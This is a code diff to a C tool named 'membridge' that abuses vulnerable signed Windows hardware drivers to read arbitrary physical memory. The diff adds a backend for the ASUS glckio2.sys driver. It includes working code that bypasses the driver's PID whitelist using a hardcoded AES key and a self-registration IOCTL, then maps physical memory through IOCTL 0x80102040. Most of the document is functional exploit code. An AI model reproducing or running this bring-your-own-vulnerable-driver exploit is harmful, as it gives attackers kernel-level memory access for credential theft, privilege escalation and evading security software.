@@ -18,13 +18,14 @@
 #include <windows.h>
 #include <setupapi.h>
 #include <devguid.h>
+#include <bcrypt.h>
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -68,6 +69,9 @@ static const backend_t g_backends[] = {
     { L"eneio64", L"drivers\\eneio64\\eneio64.sys",
       BK_CONTROL, L"MembridgeEneio", L"\\\\.\\GLCKIo", LY_ENEIO_MAP, 1,
       L"eneio64.sys (ASUS/GIGABYTE ENE WinIO; IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
+    { L"glckio2", L"drivers\\glckio2\\glckio2.sys",
+      BK_CONTROL, L"MembridgeGlckio2", L"\\\\.\\GLCKIo2", LY_GLCKIO2_MAP, 1,
+      L"glckio2.sys (ASUS GLCKIO2; PID whitelist bypass via AES registration + IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -99,6 +103,7 @@ static const char *layout_name(layout_t l) {
     case LY_HP_MAP: return "hp_swtools";
     case LY_RTKIO_MAP: return "rtkio";
     case LY_ENEIO_MAP: return "eneio64";
+    case LY_GLCKIO2_MAP: return "glckio2";
     }
     return "?";
 }
@@ -512,6 +517,77 @@ static int read_eneio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) 
     return 0;
 }
 
+// glckio2 (ASUS GLCKIO2): same WinIO MAPPHYSTOLIN structure as eneio64, but the driver
+// gates IOCTLs by a PID whitelist. The whitelist can be populated by the registration IOCTL
+// 0x80102060, which AES-128-ECB-decrypts its 16-byte input (key AA7E1516...) and compares it
+// to { bswap32(current PID), 0, 0, 0, ... }. Supplying AES-encrypt(that plaintext) self-registers
+// the current process, after which 0x80102040 maps arbitrary physical memory.
+static int glckio2_aes_block(const uint8_t in[16], uint8_t out[16], int encrypt) {
+    static const uint8_t key[16] = {
+        0xAA, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
+        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
+    };
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    NTSTATUS st;
+    ULONG outLen = 0;
+    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (st < 0) return 0;
+    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+                           (PUCHAR)BCRYPT_CHAIN_MODE_ECB, (ULONG)sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+    if (st >= 0)
+        st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, sizeof(key), 0);
+    if (st >= 0) {
+        if (encrypt)
+            st = BCryptEncrypt(hKey, (PUCHAR)in, 16, NULL, NULL, 0, out, 16, &outLen, 0);
+        else
+            st = BCryptDecrypt(hKey, (PUCHAR)in, 16, NULL, NULL, 0, out, 16, &outLen, 0);
+    }
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return st >= 0 && outLen == 16;
+}
+
+static uint32_t glckio2_bswap32(uint32_t v) {
+    return ((v & 0xFF) << 24) | ((v & 0xFF00) << 8) | ((v >> 8) & 0xFF00) | ((v >> 24) & 0xFF);
+}
+
+static int read_glckio2_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    static int registered = 0;
+    DWORD ret = 0;
+    if (!registered) {
+        uint64_t expected = (uint64_t)glckio2_bswap32(GetCurrentProcessId());
+        uint8_t plain[16], cipher[16];
+        memset(plain, 0, sizeof(plain));
+        memcpy(plain, &expected, 8);
+        int ok = 0;
+        for (int dir = 0; dir < 2 && !ok; dir++) {
+            if (!glckio2_aes_block(plain, cipher, dir)) break;  // dir=0 decrypt, dir=1 encrypt
+            ok = DeviceIoControl(dev, 0x80102060u, cipher, sizeof(cipher), NULL, 0, &ret, NULL) ? 1 : 0;
+        }
+        if (!ok) { wprintf(L"[ERR] glckio2 whitelist registration err=%lu\n", GetLastError()); return 0; }
+        registered = 1;
+    }
+    uint8_t in[40], res[40];
+    memset(in, 0, sizeof(in));
+    memset(res, 0, sizeof(res));
+    *(uint64_t *)(in + 0) = size;
+    *(uint64_t *)(in + 8) = pa;
+    if (!DeviceIoControl(dev, 0x80102040u, in, sizeof(in), res, sizeof(res), &ret, NULL)) {
+        wprintf(L"[ERR] glckio2 IOCTL_WINIO_MAPPHYSTOLIN err=%lu\n", GetLastError());
+        return 0;
+    }
+    uint64_t cand[3] = { *(uint64_t *)(res + 24), *(uint64_t *)(res + 16), *(uint64_t *)(res + 32) };
+    for (int i = 0; i < 3; i++) {
+        if (cand[i] < 0x10000 || cand[i] > 0x7FFFFFFFFFFFull) continue;
+        SIZE_T got = 0;
+        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cand[i], out, size, &got) && got == size)
+            return 1;
+    }
+    wprintf(L"[ERR] glckio2 mapped linear address unusable\n");
+    return 0;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -522,6 +598,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_HP_MAP: return read_hp_map(dev, pa, size, out);
     case LY_RTKIO_MAP: return read_rtkio_map(dev, pa, size, out);
     case LY_ENEIO_MAP: return read_eneio_map(dev, pa, size, out);
+    case LY_GLCKIO2_MAP: return read_glckio2_map(dev, pa, size, out);
     }
     return 0;
 }
@@ -563,7 +640,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -613,6 +690,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"hp_swtools") == 0 || _wcsicmp(layout, L"hp_map") == 0) g_manual_layout = LY_HP_MAP;
         else if (_wcsicmp(layout, L"rtkio") == 0 || _wcsicmp(layout, L"rtkio_map") == 0) g_manual_layout = LY_RTKIO_MAP;
         else if (_wcsicmp(layout, L"eneio64") == 0 || _wcsicmp(layout, L"eneio") == 0) g_manual_layout = LY_ENEIO_MAP;
+        else if (_wcsicmp(layout, L"glckio2") == 0 || _wcsicmp(layout, L"glckio") == 0) g_manual_layout = LY_GLCKIO2_MAP;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
